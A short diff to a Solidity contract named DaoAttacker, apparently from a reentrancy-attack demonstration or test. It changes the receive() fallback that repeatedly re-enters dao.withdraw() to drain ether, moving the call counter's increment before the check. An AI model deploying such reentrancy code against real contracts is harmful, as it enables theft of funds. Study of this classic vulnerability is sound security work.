@@ -56,8 +56,8 @@ contract DaoAttacker {
     }
 
     receive() external payable {
+        calls += 1;
         if (calls < maxCalls && address(dao).balance >= 1 ether) {
-            calls += 1;
             dao.withdraw();
         }
     }
